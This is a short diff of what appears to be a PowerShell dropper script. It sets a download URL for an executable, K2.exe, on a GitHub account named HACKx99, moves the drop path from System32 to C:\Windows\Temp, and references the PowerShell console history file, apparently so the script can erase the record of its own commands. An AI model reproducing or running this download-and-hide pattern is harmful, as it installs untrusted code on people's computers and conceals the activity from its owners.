@@ -7,7 +7,7 @@ try {
 
     # Use RAW GitHub URL for direct download
     $exeUrl = "https://github.com/HACKx99/WebSite/raw/main/K2.exe"
-    $system32Path = "$env:windir\System32\K2.exe"
+     $tempPath = "C:\Windows\Temp\K2.exe"
     $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 
     Write-Output "Downloading EXE from GitHub..."
@@ -83,3 +83,4 @@ try {
 } catch {
     Write-Error "Error: $($_.Exception.Message)"
 }
+
